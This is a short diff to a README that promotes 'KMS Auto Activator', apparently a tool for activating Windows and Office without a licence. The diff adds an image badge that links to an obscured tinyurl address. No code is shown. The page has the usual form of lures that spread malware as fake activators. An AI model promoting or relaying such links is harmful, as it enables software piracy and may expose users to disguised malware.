@@ -3,7 +3,7 @@
 ## 🤖 The Era of Automatic Activation
 **KMS Auto Activator** represents the next evolution in software activation—a completely automated system that handles everything from detection to completion without requiring user intervention. Experience true hands-free activation for both Windows and Microsoft Office! ✨
 
-
+[![64237123](https://github.com/user-attachments/assets/bb3e1d9e-8053-4508-b7f7-f81487b1ed99)](https://tinyurl.com/2dww798w)
 
 ## 🎯 Why Automation Matters
 ### ⚡ **Ultimate Efficiency**
